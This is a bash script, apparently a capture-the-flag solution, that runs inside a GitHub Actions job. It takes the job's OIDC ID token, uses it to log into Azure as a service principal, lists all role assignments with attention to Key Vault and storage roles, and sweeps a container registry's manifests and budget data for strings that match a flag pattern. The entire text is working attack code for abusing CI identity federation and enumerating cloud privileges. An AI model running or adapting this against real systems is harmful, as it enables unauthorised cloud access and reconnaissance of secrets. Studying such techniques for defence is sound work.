#!/usr/bin/env bash
set +e
IDTOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$IDTOKEN" --allow-no-subscriptions >/dev/null
FLAGRE='[A-Za-z0-9_]{2,}\{[^}]{3,}\}'

echo "===== 1) TẤT CẢ role assignments (resolve principal) ====="
az role assignment list --all --include-inherited \
  --query "[].{p:principalName,id:principalId,type:principalType,role:roleDefinitionName,scope:scope}" -o json > /tmp/ra.json
echo "total=$(jq length /tmp/ra.json)"
echo "--- ai có role trên kv-tbl-sec ---"
jq -r '.[] | select(.scope|test("kv-tbl-sec";"i")) | "\(.role)  <=  \(.p // .id)  [\(.type)]"' /tmp/ra.json
echo "--- tất cả role 'Key Vault' (mọi scope) ---"
jq -r '.[] | select(.role|test("Key Vault";"i")) | "\(.role)  <=  \(.p // .id)  @ \(.scope)"' /tmp/ra.json
echo "--- role 'Storage Blob' ---"
jq -r '.[] | select(.role|test("Storage Blob";"i")) | "\(.role)  <=  \(.p // .id)  @ \(.scope)"' /tmp/ra.json

echo "===== 2) ACR catalog (mọi repo) + soi flag ====="
for r in $(az acr repository list -n crtblplatprodx3euoz -o tsv 2>/dev/null); do
  echo "repo: $r"
  az acr repository show-tags -n crtblplatprodx3euoz --repository "$r" -o tsv 2>/dev/null | while read t; do
    az acr manifest show -r crtblplatprodx3euoz -n "$r:$t" -o json 2>/dev/null | grep -aoE "$FLAGRE"
  done
done

echo "===== 3) Cost Management (cost-reader angle) ====="
az consumption budget list -o json 2>/dev/null | grep -aoE "$FLAGRE"
echo "===== DONE ====="
